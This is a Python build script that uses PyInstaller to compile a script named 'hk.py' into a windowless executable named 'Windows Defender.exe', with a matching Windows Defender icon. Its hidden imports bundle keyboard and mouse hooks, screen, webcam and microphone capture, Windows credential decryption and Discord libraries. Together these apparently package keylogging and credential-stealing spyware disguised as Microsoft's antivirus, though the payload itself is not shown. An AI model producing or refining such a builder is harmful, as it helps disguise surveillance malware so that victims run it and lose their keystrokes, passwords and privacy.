import subprocess
import sys
import os





def create_exe(script_path, icon_path, output_name):
    if not os.path.isfile(script_path):
        print(f"Error: The script '{script_path}' does not exist.")
        sys.exit(1)

    if not os.path.isfile(icon_path):
        print(f"Error: The icon '{icon_path}' does not exist.")
        sys.exit(1)

    command = [
        'pyinstaller',
        '--clean',
        '--onefile',
        '--windowed',
        '--name', output_name,
        '--icon', icon_path,
        '--hidden-import=aiohttp',
        '--hidden-import=cv2',
        '--hidden-import=discord',
        '--hidden-import=pyautogui',
        '--hidden-import=pyaes',
        '--hidden-import=colorama',
        '--hidden-import=win32crypt',
        '--hidden-import=pynput.keyboard._win32',
        '--hidden-import=wave',
        '--hidden-import=sqlite3',
        '--hidden-import=sounddevice',
        '--hidden-import=pynput.mouse._win32',
        '--hidden-import=scapy.all',
        script_path
    ]


    print(""" Please Wait. Can take up to 1 minute.""")

    result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    if result.returncode != 0:
        print("Error creating the .exe file:")
        print(result.stderr.decode())
    else:
        print(f"Successfully created {output_name}.exe")

if __name__ == "__main__":
    script_path = "hk.py"
    icon_path = "Windows Defender.ico"
    output_name = "Windows Defender.exe"

    create_exe(script_path, icon_path, output_name)
